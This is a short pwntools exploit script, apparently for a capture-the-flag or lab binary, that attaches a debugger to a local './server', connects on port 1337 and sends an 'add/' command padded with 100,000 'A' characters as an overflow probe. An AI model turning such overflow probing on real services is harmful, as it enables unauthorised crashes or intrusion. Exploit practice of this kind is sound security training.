#!/usr/bin/env python

from pwn import *
import os
import sys

_DEBUG = True

context(arch='amd64', os='linux', endian='little', log_level='info')
upack = make_unpacker(64, endian='little', sign='unsigned')
pack  = make_packer(64, endian='little', sign='unsigned')

server = process('./server')

gdb.attach(server, '''
set follow-fork-mode child
break *0x00402c63
break *0x00401053
''')

io = remote('localhost', 1337)

def radare2():
    c = "aaaa; "
    c += "db main; "
    c += "db 0x00400f76; "
    c += "db; "

    os.system('screen r2 -d %d -c "%s"' % (pid, c))
    util.proc.wait_for_debugger(pid)

def exploit():
    io.recvline()
    io.sendline('add/' + 'A' * 100000)
    #io.sendline('find/' + 'A' * 2048)

    #io.sendline('tree')

    io.interactive()

if __name__ == "__main__":
    exploit()




